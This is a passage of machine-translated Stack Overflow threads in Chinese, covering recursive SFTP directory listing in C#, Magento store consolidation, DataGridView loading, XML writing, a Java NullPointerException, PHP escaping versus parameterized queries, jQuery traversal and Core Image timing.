因此，当您编写递归函数时，您必须设置一次默认目录，然后在`ListDirectory`遍历文件夹时更改调用中的目录。该清单返回一个可枚举的 SftpFiles。然后可以单独检查这些`IsDirectory == true`。请注意，该列表还返回`.`and`..`条目（它们是目录）。如果你想避免无限循环，你会想跳过这些。:-)

编辑 2/23/2018

我正在查看我的一些旧答案，并想为上面的答案道歉并提供以下工作代码。请注意，此示例不需要`ChangeDirectory`，因为它使用`Fullname`for `ListDirectory`：

```
void Main()
{
    using (var client = new Renci.SshNet.SftpClient("sftp.host.com", "user", "password"))
    {
        var files = new List<String>();
        client.Connect();
        ListDirectory(client, ".", ref files);
        client.Disconnect();
        files.Dump();
    }
}

void ListDirectory(SftpClient client, String dirName, ref List<String> files)
{
    foreach (var entry in client.ListDirectory(dirName))
    {

        if (entry.IsDirectory)
        {
            ListDirectory(client, entry.FullName, ref files);
        }
        else
        {
            files.Add(entry.FullName);
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-09-24T09:07:01.650

尝试这个：

```
var filePaths = client.ListDirectory(client.WorkingDirectory); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-08-29T09:35:02.323

我已经使用递归实现了这一点。像这样创建了一个类 TransportResponse

```
 public class TransportResponse
{
    public string directoryName { get; set; }
    public string fileName { get; set; }
    public DateTime fileTimeStamp { get; set; }
    public MemoryStream fileStream { get; set; }
    public List<TransportResponse> lstTransportResponse { get; set; }
} 
```

我创建了一个 TransportResponse 类的列表。如果 directoryName 不为空，它将包含同一个类的列表，该类将在该目录中的文件作为 MemoryStream （这可以根据您的用例进行更改）

```
List<TransportResponse> lstResponse = new List<TransportResponse>();
using (var client = new SftpClient(connectionInfo))
  {
          try
          {
                    Console.WriteLine("Connecting to " + connectionInfo.Host + " ...");
                    client.Connect();
                    Console.WriteLine("Connected to " + connectionInfo.Host + " ...");
           }
           catch (Exception ex)
           {
                    Console.WriteLine("Could not connect to "+ connectionInfo.Host +" server. Exception Details: " + ex.Message);
           }
           if (client.IsConnected)
           {
                    var files = client.ListDirectory(transport.SourceFolder);
                    lstResponse = downloadFilesInDirectory(files, client);
                    client.Disconnect();
            }
            else
            {
                    Console.WriteLine("Could not download files from "+ transport.TransportIdentifier +" because client was not connected.");
             }
   }

private static List<TransportResponse> downloadFilesInDirectory(IEnumerable<SftpFile> files, SftpClient client)
    {
        List<TransportResponse> lstResponse = new List<TransportResponse>();
        foreach (var file in files)
        {
            if (!file.IsDirectory)
            {
                if (file.Name != "." && file.Name != "..")
                {
                    if (!TransportDAL.checkFileExists(file.Name, file.LastWriteTime))
                    {
                        using (MemoryStream fs = new MemoryStream())
                        {
                            try
                            {
                                Console.WriteLine("Reading " + file.Name + "...");
                                client.DownloadFile(file.FullName, fs);
                                fs.Seek(0, SeekOrigin.Begin);
                                lstResponse.Add(new TransportResponse { fileName = file.Name, fileTimeStamp = file.LastWriteTime, fileStream = new MemoryStream(fs.GetBuffer()) });
                            }
                            catch(Exception ex)
                            {
                                Console.WriteLine("Error reading File. Exception Details: " + ex.Message);
                            }
                        }
                    }
                    else
                    {
                        Console.WriteLine("File was downloaded previously");
                    }
                }
            }
            else
            {
                if (file.Name != "." && file.Name != "..")
                {
                    lstResponse.Add(new TransportResponse { directoryName = file.Name,lstTransportResponse = downloadFilesInDirectory(client.ListDirectory(file.Name), client) });
                }                
            }
        }

        return lstResponse;
    } 
```

希望这可以帮助。谢谢

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-07-19T21:53:58.527

这是一个完整的课程。它是 .NET Core 2.1 Http 触发函数应用 (v2)

我想摆脱任何以“。”开头的目录，因为我的 sftp 服务器有 .cache 文件夹和带有键的 .ssh 文件夹。也不想处理像“。”这样的文件夹名称。或者 '..'

我最终要做的是将 SftpFile 投影到我使用的类型并将其返回给调用者（在这种情况下它将是一个逻辑应用程序）。然后我将该对象传递到一个存储过程中，并使用 OPENJSON 来构建我的监控表。这基本上是创建我的 SFTP 处理队列的第一步，该队列会将文件从我的 SFTP 文件夹中移到我的数据湖中（现在是 blob，直到我想出更好的东西）。

我使用 .WorkingDirectory 的原因是因为我创建了一个主目录为“/home”的用户。这让我可以遍历我的所有用户文件夹。我的应用程序不需要有一个特定的文件夹作为起点，可以说是用户“root”。

```
using Microsoft.AspNetCore.Http;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.Extensions.Logging;
using Renci.SshNet;
using Renci.SshNet.Sftp;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace SFTPFileMonitor
{
    public class GetListOfFiles
    {
        [FunctionName("GetListOfFiles")]
        public async Task<IActionResult> RunAsync([HttpTrigger(AuthorizationLevel.Anonymous, "get")] HttpRequest req, ILogger log)
        {
            log.LogInformation("C# HTTP trigger function processed a request.");

            List<SftpFile> zFiles;
            int fileCount;
            decimal totalSizeGB;
            long totalSizeBytes;

            using (SftpClient sftpClient = new SftpClient("hostname", "username", "password"))
            {
                sftpClient.Connect();
                zFiles = await GetFiles(sftpClient, sftpClient.WorkingDirectory, new List<SftpFile>());
                fileCount = zFiles.Count;
                totalSizeBytes = zFiles.Sum(l => l.Length);
                totalSizeGB = BytesToGB(totalSizeBytes);
            }

            return new OkObjectResult(new { fileCount, totalSizeBytes, totalSizeGB, zFiles });
        }
        private async Task<List<SftpFile>> GetFiles(SftpClient sftpClient, string directory, List<SftpFile> files)
        {
            foreach (SftpFile sftpFile in sftpClient.ListDirectory(directory))
            {
                if (sftpFile.Name.StartsWith('.')) { continue; }

                if (sftpFile.IsDirectory)
                {
                    await GetFiles(sftpClient, sftpFile.FullName, files);
                }
                else
                {
                    files.Add(sftpFile);
                }
            }
            return files;
        }
        private decimal BytesToGB(long bytes)
        {
            return Convert.ToDecimal(bytes) / 1024 / 1024 / 1024;
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-09-25T20:53:54.647

@卡洛斯·博斯

> 这个库有一些使这个递归列表变得棘手的怪癖，因为 ChangeDirectory 和 ListDirectory 之间的交互不像你所期望的那样工作。

正确的

当 ChangeDirectory() 参数为 "." 时效果很好。

但如果你这样做

```
SftpClient sftp ...;
sftp.ChangeDirectory("some_folder");
//get file list
List<SftpFile> fileList = sftp.ListDirectory("some_folder").ToList(); 
```

然后有一个断言，因为 ListDirectory() 调用需要“some_folder/some_folder”

我使用的解决方法是在远程上传/重命名为“some_folder”之前保存并恢复当前目录，并且您需要在操作之前列出该文件夹（例如查看文件已经存在）

```
string working_directory = sftp.WorkingDirectory;
sftp.ChangeDirectory("some_folder");
sftp.RenameFile("name", "new_name");
sftp.ChangeDirectory(working_directory); 
```

检查文件是否存在，这个调用就足够了

```
sftp.Exists(path) 
```

或者如果您想添加一些其他条件，例如区分大小写或不区分大小写

```
 public FileExistence checkFileExists(string folder, string fileName)
    {
      //get file list
      List<SftpFile> fileList = sftp.ListDirectory(folder).ToList();

      if (fileList == null)
      {
        return FileExistence.UNCONFIRMED;
      }

      foreach (SftpFile f in fileList)
      {
        Console.WriteLine(f.ToString());
        //a not case sensitive comparison is made
        if (f.IsRegularFile && f.Name.ToLower() == fileName.ToLower())
        {
          return FileExistence.EXISTS;
        }
      }

      //if not found in traversal , it does not exist
      return FileExistence.DOES_NOT_EXIST;
    } 
```

FileExistence 在哪里

```
public enum FileExistence
    {
      EXISTS,
      DOES_NOT_EXIST,
      UNCONFIRMED
    }; 
```

# magento - 我有许多单独的 magento 安装，我可以将它们合并在一起吗？

> ID：13572892
> 
> 赞同：1
> 
> 时间：2012-11-26T20:46:56.257
> 
> 标签：magento

我刚刚开始了一份新工作，我们安装了几个不同版本的磁电机！

现在，在我看来，我们需要首先将它们全部升级，然后将它们全部安装在一个磁电机安装并使用一个数据库中。

这样做的最佳方法（一般而言）是什么。是否有可能或者我最好的选择是在一次安装下再次创建站点并将产品导入其中。

一位开发人员说，让它们在不同的安装下有助于提高性能。这是真的？

一旦我们将它们全部安装在一个安装中，诸如库存控制和订单以及将产品放在多个站点上之类的东西也应该非常简单-对吗？

我们正在谈论不少商店说大约 15 左右，不少产品大约我会说 4000 可能更多。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-26T21:49:27.867

我的第一个建议是考虑原因，为什么需要在一个安装下移动所有 Magento 实例。从你的问题看原因还不清楚。所以最好的开发人员建议是“它有用吗？那就不要碰它”:)

如果没有具体原因，那么您最好保持原样。软件系统的所有重组过程（升级、基础设施配置、访问设置等）都是困难的、昂贵的、耗时的、容易出错的，从业务角度来看通常没有太大的价值，而且有点无聊。这不是 Magento 特有的东西，它只是任何软件的一般特征。

另请注意，这是一个假期。因此，最好在 1 月中旬之前不要对电子商务商店进行任何操作。

如果您看到重组 Magento 商店的价值，那么最好的方法是逐步进行 - 一步一步，逐个商店：

1.  以您最复杂的商店为例。为进一步的步骤准备所需的一切 - 即准备好工具，编写自动脚本，在某些测试服务器上完成该过程及其副本。编写一组功能测试以至少通过冒烟测试来覆盖它。您必须多次重复这样的轻量级检查才能确定商店似乎在工作。自动测试将节省大量时间。因此，所有这些准备工作将减少您的停机时间。
2.  关闭对商店的公共访问。
3.  将商店升级到 Magento 版本，您需要。将其移至新的基础设施。
4.  手动验证所有用户场景并使用自动测试。解决问题（如果有）。
5.  开放对商店的公共访问。监控日志，在服务器机器上加载报告。修复问题，如果有的话。
6.  拿下一家商店（我们称之为 NextStore）。在沙盒服务器上制作它的副本。
7.  在沙盒服务器上复制您已经转换的商店（我们称之为 ConvertedStore）。
8.  从 NextStore 的副本中导出所有数据并将其导入到 ConvertedStore 的副本中。您可以使用 Magento Dataflow 或 Import/Export 模块来执行此操作。并非所有数据都可以使用这些模块导入/导出 - 只是目录、订单、客户。如果需要，您将需要开发自定义脚本来导入/导出其他实体。
9.  手动验证结果并使用自动测试和手动验证。编写自动脚本，修复发现的问题。在真正的转换过程中，您稍后将需要这些脚本。
10.  关闭 NextStore。
11.  通过使用已经准备好的程序和脚本，将其移至新的基础设施。您需要考虑在转换过程中是否关闭 ConvertedStore。这取决于你的感觉，是否可以打开它。出于安全原因，最好关闭它。
12.  验证，一切正常。监控日志、报告。
13.  修复问题，如果有的话。
14.  继续您的其他商店。

这是我（完全个人）对程序的看法。

> 一位开发人员说，让它们在不同的安装下有助于提高性能。这是真的？

是的，你的朋友是对的。将 Magento（实际上是这个世界上的任何东西）分离成更小的实例可以让处理起来更轻松。性能差异非常小（对于您的 4000 个产品的实例），但这是不可避免的。考虑一下，在组合实例后（假设其中有 10 个实例，每个实例有 400 种产品），您将处理 10 倍以上的客户、报告、产品、商店等的数据。因此，任何搜索都必须经过 10 倍以上产品，以返回数据。当然，如果搜索需要 0.00001 秒也没关系，因为组合实例的 0.0001 秒也可以。但是有些东西，比如排序或匹配集，是非线性增长的。但是，如前所述，对于 4000 种产品，您不会看到太大的差异。

> 一旦我们将它们全部安装在一个安装中，诸如库存控制和订单以及将产品放在多个站点上之类的东西也应该非常简单-对吗？

你是对的 - 将商店合并在一起后，处理订单、库存，客户将更加简单和直接的过程。

祝你好运！:)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T21:38:10.320

要考虑的最重要的事情是通过将所有这些站点放在一个 Magento“实例”上来解决什么问题。对您的业务/团队来说更重要的是：让这些站点共享产品和库存，还是具有独立修改这些站点的灵活性？任何停机时间或对可用性的影响都可能影响所有站点。

进一步的问题/调查领域：产品层次结构（类别和属性）有多大不同？每个站点的定价是相同的还是不同的？这些站点中的任何一个是否是多区域的？每个区域的定价是如何处理的？

当然可以在一个 Magento 实例上运行多个站点，即使平台内存在一些粗糙的边缘。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-10-04T14:19:53.833

由于无法在 Magento 中导出所有实体，因此没有合并商店的功能。您必须编写自定义代码 - 它必须从旧存储中获取所有记录，为它们分配新 ID，同时保持引用完整性并将它们插入新存储（这是“产品导入”所做的，但它们没有它用于类别、订单、客户等）。

在我看来，您为此编写的代码量几乎比重新开始要花费更长的时间。您基本上是在为 Magento 编写缺少的功能。如果这很容易，他们早就做到了。

然而，将两个商店分开非常容易，因为您不必担心在数据库中重新分配唯一标识符。

# vb.net - Datagridview 优化 VB.Net

> ID：13572895
> 
> 赞同：0
> 
> 时间：2012-11-26T20:47:03.127
> 
> 标签：vb.net, datagridview, rows

我只想问是否有另一种选择来填充datagridview中的单元格。目前我正在使用这段代码：

对于 i = DataGridView1.CurrentCell.RowIndex 到 x - 1

```
 DataGridView1.Rows(i).Cells("LastName").Value = empcoll.Item(i).LastName
        DataGridView1.Rows(i).Cells("FirstName").Value = empcoll.Item(i).FirstName
        DataGridView1.Rows(i).Cells("MiddleName").Value = empcoll.Item(i).MiddleName
        DataGridView1.Rows(i).Cells("CreatedBy").Value = empcoll.Item(i).CreatedBy
        DataGridView1.Rows(i).Cells("CreateDate").Value = empcoll.Item(i).CreateDate
        DataGridView1.Rows(i).Cells("Status").Value = empcoll.Item(i).Status
        DataGridView1.Rows(i).Cells("DailySalary").Value = empcoll.Item(i).DailySalary
        DataGridView1.Rows(i).Cells("BirthDate").Value = empcoll.Item(i).BirthDate

    Next i 
```

但是当我将它用于具有大量记录的数据库时，它往往会加载缓慢并挂起。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T21:35:02.820

通常，您应该将列数据绑定到对象的属性，而不是您当前使用的方法。

它看起来像这样

```
LastNameColumn.DataPropertyname = "LastName"
FirstNameColumn.DataPropertyname = "FirstName"
....
DataGridView1.DataSource = MyListofEmployeeObjects 
```

至于加载速度，有两种选择：分页和虚拟模式。

使用分页，您可以一次从数据库中提取 X 条 Y 条记录并将它们显示在网格中。

虚拟模式 ( [http://msdn.microsoft.com/en-us/library/ms171622.aspx](http://msdn.microsoft.com/en-us/library/ms171622.aspx) ) 使 DataGridView 能够处理从/向数据库自动拉/推记录，这样您就不必加载所有记录立刻。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-16T08:42:57.040

好吧，我更喜欢对无界 DataGridViews 使用 DatagridView.Rows.Add 方法。

像这样的东西：

```
Dim loData(7) as object
DataGridView1.Rows.Clear()
For i = DataGridView1.CurrentCell.RowIndex To x - 1
   loData(0) = empcoll.Item(i).LastName
   loData(1) = empcoll.Item(i).FirstName
   loData(2) = empcoll.Item(i).MiddleName
   loData(3) = empcoll.Item(i).CreatedBy
   loData(4) = empcoll.Item(i).CreateDate
   loData(5) = empcoll.Item(i).Status
   loData(6) = empcoll.Item(i).DailySalary
   loData(7) = empcoll.Item(i).BirthDate
   DataGridView1.Rows.Add(loData)
Next i 
```

我通常声明 en enum 为每个数组元素赋予含义名称并使代码更清晰：

```
private enum eCols
   LastName
   Firstname
   MiddleName
   CreatedBy
   CreateDate
   Status
   DailySalary
   BirthDate
end enum

Dim loData(7) as object
DataGridView1.Rows.Clear()
For i = DataGridView1.CurrentCell.RowIndex To x - 1
   loData(eCol.LastName) = empcoll.Item(i).LastName
   loData(eCol.FirstName) = empcoll.Item(i).FirstName
   loData(eCol.MiddleName) = empcoll.Item(i).MiddleName
   loData(eCol.CreatedBy) = empcoll.Item(i).CreatedBy
   loData(eCol.CreateDate) = empcoll.Item(i).CreateDate
   loData(eCol.Status) = empcoll.Item(i).Status
   loData(eCol.DailySalary) = empcoll.Item(i).DailySalary
   loData(eCol.BirthDate) = empcoll.Item(i).BirthDate
   DataGridView1.Rows.Add(loData)
Next i 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T21:16:57.580

您可以使用 SQLDataSource 控件 ( [http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.sqldatasource.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.sqldatasource.aspx) )，然后将 DataGridView 绑定到 SQLDataSource。它在这里描述：[http](http://www.vkinfotek.com/gridview/bind-gridview-sqldatasource-control.html) ://www.vkinfotek.com/gridview/bind-gridview-sqldatasource-control.html 。

# c# - 多个 XML 元素相互覆盖

> ID：13572897
> 
> 赞同：0
> 
> 时间：2012-11-26T20:47:07.287
> 
> 标签：c#, xml

我正在使用 a`XMLWriter`创建一个基本的 XML，XML 文件有一个元素，一切都在其中，为了解释，可以说这只是`people`在里面，里面需要有多个元素，让我们`person`在里面调用它们其中我们有称为`names`.

所以它看起来像这样

```
<?xml version="1.0" encoding="utf-8"?>
<people>
  <person>
    <name>Name1</name>
  </person>
  <person>
    <name>Name2</name>
  </person>
  <person>
    <name>Name3</name>
  </person>
</people> 
```

但是当我去写一个新的`person`时候它会像这样出来（它只是覆盖它）：

```
<?xml version="1.0" encoding="utf-8"?>
<people>
  <person>
    <name>Name5</name>
  </person>
</people> 
```

我正在使用它来编写每个`person`元素...

```
writer.WriteStartElement("person");
writer.WriteElementString(keys[i], values[i]);
writer.WriteEndElement(); 
```

有什么办法可以阻止它覆盖？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:53:16.900

如果你想试试[LinqToXml](http://msdn.microsoft.com/en-us/library/bb387061.aspx)

```
var xDoc = XDocument.Load(fileName);

var people = xDoc.Element("people");
people.Add(new XElement("person", new XElement("name", "name4")));

xDoc.Save(fileName, SaveOptions.None); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T04:38:08.423

LB提供的答案是我个人使用的。关于 xml 编写器，我不确定这是否可行，但值得一试。尝试以附加模式创建文件流。

```
Stream xmlFile = new FileStream(@"c:\path",FileMode.Append);
XmlTextWriter xmlWriter = new XmlTextWriter(xmlFile, Encoding.Default); 
```

# java - 运行时 NullPointerException

> ID：13572899
> 
> 赞同：1
> 
> 时间：2012-11-26T20:47:07.810
> 
> 标签：java, nullpointerexception, thread-sleep

运行 Java 代码时出现一些错误。它编译得很好，但我得到运行时错误和异常。这是代码：

```
import java.io.*;
class display {

private int charNumber;
private char[] currentArray;

public display() {

    charNumber = 0;

    }

public void dispText(String text, long speed, long wait) {
    while(currentArray[charNumber] != '~') {
        currentArray = text.toCharArray();
        System.out.print(currentArray[charNumber]);
        try {
            Thread.sleep(speed);
        } catch (NullPointerException e) {
            System.out.println("Error in the Thread process:\n" + e);
        } catch (InterruptedException e) {
            System.out.println("Error in the Thread process:\n" + e);
        }
        charNumber++;
        }
    charNumber = 0;
    try {
        Thread.sleep(wait);
    } catch (NullPointerException e) {
        System.out.println("Error in the Thread process:\n" + e);
    } catch (InterruptedException e) {
        System.out.println("Error in the Thread process:\n" + e);
    }
}

public void resetCharNumber() {
    charNumber = 0;
    }
}

class Main {
public static void main (String[] args) throws Exception {
    //Make sure to include a '~' at the end of every String.    
    String start = "Hey, is this thing on?~";
    String hello = "Hello, World!~";
    display d = new display();
    d.dispText(start, 200, 2000);
    d.dispText(hello, 200, 2000);
    System.out.println("\nDone!");
}
} 
```

`void dispText`需要一个字符串来显示文本，`System.out.print`长速度来确定每次显示一个字符时经过多少时间（如打字机）和长等待，以确定在执行下一个过程之前经过了多少时间。`dispText`获取 String 文本，将其转换为 char 数组`text.toCharArray();`，然后进入 while 循环，每次运行显示一个字符，然后等待 speed 指定的时间，然后移动到下一个字符。它会一直这样做，直到它到达最后一个字符（'~'），该字符作为最后一个字符包含在提供给文本的字符串中。然后，它移动到下一行。然后在main中，创建了一个显示类的实例，命名为'd'，并且d执行了两次dispText。

这是我运行它时遇到的运行时错误：

> 运行时错误：在 Main.main(Main.java:48)
> 的 display.dispText(Main.java:14)处的线程“main”java.lang.NullPointerException中的异常

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-26T20:48:23.120

你声明你的数组像： -

```
private char[] currentArray; 
```

但是你从来没有初始化它。您应该在构造函数中对其进行初始化，例如：-

```
currentArray = new char[size]; 
```

* * *

**或者，**如评论中所述，您正在初始化数组，但位置错误。

您的 while 循环中有此代码：-

```
while(currentArray[charNumber] != '~') {
        currentArray = text.toCharArray(); 
```

只需将第一条语句移到 while 循环之外：-

```
currentArray = text.toCharArray();  // Move this outside the while
while(currentArray[charNumber] != '~') { 
```

然后你就不需要在构造函数中初始化数组了。

* * *

作为旁注，请遵循 Java 命名约定。类名应以大写字母开头，之后应遵循 CamelCasing。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:53:59.897

您未能在使用之前初始化 char 数组，而是从循环内的字符串中提取字符。（并且您的循环索引初始化不正确）。

改变：

```
public void dispText(String text, long speed, long wait) {
    while(currentArray[charNumber] != '~') {
        currentArray = text.toCharArray();
        ... 
```

到

```
public void dispText(String text, long speed, long wait) {
    currentArray = text.toCharArray();
    for(charNumber=0; currentArray[charNumber] != '~'; charNumber++) {
        ... 
```

并从循环中删除 charNumber 增量。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T20:50:30.873

currentArray 在您尝试使用它之前尚未初始化。

```
while(currentArray... 
```

# c# - 将 GeoIP.dat 包含到 ClickOnce 部署中

> ID：13572900
> 
> 赞同：0
> 
> 时间：2012-11-26T20:47:14.743
> 
> 标签：c#, include, clickonce, geoip

我创建了一个 C# 应用程序，它依赖于 MaxMind GeoIP.dat 文件才能工作。

如何将它包含到 ClickOnce 构建中，以便 GeoIP.dat 文件自动安装到应用程序目录中？

我将 GeoIP.dat 添加为资源，但这没有帮助，它没有被包含在内。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-27T17:47:52.793

我自己解决了

您需要转到资源属性并将资源设置为始终包含，然后您可以将它们嵌入到构建过程中并包含在内。

# php - mysql_escape_string 根本不应该使用吗？如果没有，有什么替代方案？

> ID：13572902
> 
> 赞同：0
> 
> 时间：2012-11-26T20:47:29.143
> 
> 标签：php, mysql

我有一堆没有正确清理的代码。最好的方法是绑定变量，这个页面[http://php.net/manual/en/function.mysql-escape-string.php](http://php.net/manual/en/function.mysql-escape-string.php)说不应该使用mysql_escape_string（我使用的是5.3.2）全部。

mysql_escape_string 在高于 5.3.0 的版本中根本不起作用吗？

编辑：我知道绑定是最好的方法，但是有一堆旧代码需要清理。所以如果我使用mysql_escape_string，它根本就不起作用吗？没用吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:49:17.920

最好的选择是使用 PDO 之类的准备好的/参数化查询。如果您想坚持以更原生的方式与 MySQL 交互，您也可以使用 MySQLi。使用参数化查询，数据是独立于 SQL 发送的，就 SQL 注入而言，它本质上是安全的。

如果您正在寻找`mysql_escape_string()`直接的替代品，那将是`mysql_real_escape_string()`. 它是一种直接替代品，如果您完全关心安全性，则必须使用它。

# algorithm - 我们如何打印这个输出？

> ID：13572903
> 
> 赞同：-2
> 
> 时间：2012-11-26T20:47:38.300
> 
> 标签：algorithm, language-agnostic

```
String x = "1 -7 2";
String y = "-2 2 1"; 
```

输出：

```
1,-2
-7,2
2,1 
```

我们将使用 x 的第一个负数或正数，y 的第一个数...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:07:50.410

在 Java 中，您可以使用 Scanner 类。

```
String integers = "1 -4 3";
Scanner sc = new Scanner(integers);
while(sc.hasNextInt())
{
    System.out.println(sc.nextInt();
} 
```

在 javadocs 中查找 :) [http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html](http://docs.oracle.com/javase/7/docs/api/java/util/Scanner.html)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T20:51:52.483

只是一个粗略的草图

*   将空白处的两个字符串拆分为数组
*   循环这两个数组并将它们一一合并

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-26T20:52:17.040

对于 Java：

您可以使用 split 方法拆分每个字符串，然后您有一个数组，您可以从每个数组中打印出相应的字符。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-11-26T20:53:38.023

在`java`使用中直接`split`作用于空间`" "`

在空间上`c`使用并将它们放入2个整数数组中，然后循环遍历它。迭代第一个数组迭代第二个数组并打印这些数字`strtok``' '``odd``even`

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-11-26T20:54:54.967

这处理 x 和 y 大小不同的情况

```
 String x = "1 -7 2";
    String y = "-2 2 1";

    // Split the strings
    String[] xSplit = x.split("\\s+");
    String[] ySplit = y.split("\\s+");

    // Loop through them
    for (int i = 0; i < xSplit.length; i++) {
        System.out.print(xSplit[i] + " ");

        if (i < ySplit.length)
            System.out.print(ySplit[i] + " ");
    }

    // Print more y if needed
    for (int i = xSplit.length; i < ySplit.length; i++) {
        System.out.print(ySplit[i] + " ");
    }

    System.out.println(); 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-11-26T20:57:05.680

在 C 中执行此操作的简单方法：

```
char * x = "1 -7 2";
char * y = "-2 2 1";
int xs[3], ys[3];

sscanf(x, "%d %d %d", xs, xs+1, xs+2);
sscanf(y, "%d %d %d", ys, ys+1, ys+2);

printf("%d, %d\n%d, %d\n%d, %d\n", xs[0], ys[0], xs[1], ys[1], xs[2], ys[2]); 
```

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-11-26T20:54:13.190

这应该这样做：

```
String[] splitX = x.split(" ");
String[] splitY = y.split(" ");

System.out.println(splitX[0]+","+splitY[0]);
System.out.println(splitX[1]+","+splitY[1]);
System.out.println(splitX[2]+","+splitY[2]); 
```

# javascript - 单击时隐藏子元素

> ID：13572905
> 
> 赞同：1
> 
> 时间：2012-11-26T20:47:41.460
> 
> 标签：javascript, jquery

我试图在单击“头”时隐藏“arrow_o”，但它不起作用。jquery“孩子”在表中不起作用吗？

html

```
<thead class="thead">
  <tr>
    <th>
      <div class="arrow_o"></div>
    </th>
  </tr>
</thead> 
```

js

```
$(document).ready(function() {
  $('.thead').click(function() {
    $(this).children('.arrow_o').hide();
  });
}); 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:49:41.763

> .children() 方法与 .find() 的不同之处在于 .children() 仅沿 DOM 树向下移动一个级别，而 .find() 也可以向下遍历多个级别以选择后代元素（孙子等）。

所以这：

```
$(document).ready(function() {
  $('.thead').click(function() {
    $(this).find('.arrow_o').hide();
  });
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-26T20:49:38.307

试试`$('.arrow_o', this).hide();`这基本上设置了`arrow_o`应该位于的上下文。

**完整代码：**

```
$(document).ready(function() {
  $('.thead').click(function() {
     $('.arrow_o', this).hide();
  });
}); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-11-26T20:49:48.840

> .children() 方法与 .find() 的不同之处在于 .children() 仅沿 DOM 树向下移动一个级别，而 .find() 也可以向下遍历多个级别以选择后代元素（孙子等）。

[jQuery 孩子](http://api.jquery.com/children/)

使用[.find()](http://api.jquery.com/find/)代替。

# java - Java 奇怪的行为。.jar 无法打开

> ID：13572906
> 
> 赞同：2
> 
> 时间：2012-11-26T20:47:41.833
> 
> 标签：java, windows, runtime

每当我尝试双击 .jar 文件时，它都会提示我无法定位或加载文件的主类。但是，如果我尝试在命令行中打开 .jar 文件，如下所示：

```
java -jar myfile.jar 
```

然后，它运行。是系统变量有问题还是什么？我在使用 java 时遇到了很多麻烦，并且再次卸载并重新安装它似乎无法解决它。

提前致谢！

额外信息：我在 Win7 64 位上运行，同时带有 JDK 7 Update 9（64 位）和 Java 7 Update 9（64 位）。以前也是双击运行.jar文件，不知道怎么回事。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T21:09:45.843

检查这两个配置是否到位：

```
C:\>assoc .jar
    .jar=jarfile

C:\>ftype jarfile
     jarfile="C:\Program Files (x86)\Java\jre6\bin\javaw.exe" -jar "%1" %* 
```

后者指向您的 javaw.exe 的正确位置。它应该工作。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-26T20:52:56.743

Win7中双击jar不会将-jar标志传递给java程序，所以什么也不会发生。

# ios - Core Image 在第一次渲染时慢了很多倍

> ID：13572908
> 
> 赞同：4
> 
> 时间：2012-11-26T20:47:43.863
> 
> 标签：ios

我找不到任何来自 Apple 的文档来解释为什么这段代码根据运行次数而以不同的速度运行。

```
- (void)speedTest2:(CIImage*)source {
    NSTimeInterval start = CFAbsoluteTimeGetCurrent();

    CIFilter* filter = [CIFilter filterWithName:@"CIColorInvert"];
    [filter setValue:source forKey:kCIInputImageKey];

    CGImageRef cgImage = [_context createCGImage:filter.outputImage fromRect:source.extent];
    UIImage* output = [UIImage imageWithCGImage:cgImage];
    if (cgImage)
        CFRelease(cgImage);
    _source.image = output;

    NSLog(@"time: %0.3fms", 1000.0f * (CFAbsoluteTimeGetCurrent() - start));
} 
```

### 运行时间

*   全新应用安装 - 首次调用方法 = **206 毫秒**
*   应用程序重新启动 - 首次调用方法 = **61 毫秒**
*   第二次调用方法 (3rd, 4th, ...) = **14ms**

每次运行都使用相同的源图像。

我知道 Core Image 连接过滤器链。这是否以某种方式被缓存？我可以预先缓存此操作，以便用户在首次启动应用时不会遇到性能问题吗？

这个让我抓狂:(

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-07T20:05:24.630

一部分开销可能是图像库本身的加载。如果效果是作为像素着色器实现的，那么很可能在幕后进行编译步骤。

这种隐性成本是不可避免的，但您可以选择在更方便的时候进行。例如，当应用程序正在加载时。

我建议加载一个小图像（1x1 px）并在加载过程中对其应用一些效果，看看它是否有帮助。

您可能还想尝试 Apple 官方论坛以获得回复。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-12-05T11:38:21.823

有三种方法可以创建上下文来绘制 outputImgae；`contextWithOptions:`这基于您的设备在 GPU 或 CPU 上创建；`contextWithEAGLContext:; contextWithEAGLContext:`选项：在 GPU 上创建；查看核心图像编程指南；

# java - Grails：GORM：遍历多对多关系

> ID：13572912
> 
> 赞同：0
> 
> 时间：2012-11-26T20:47:58.527
> 
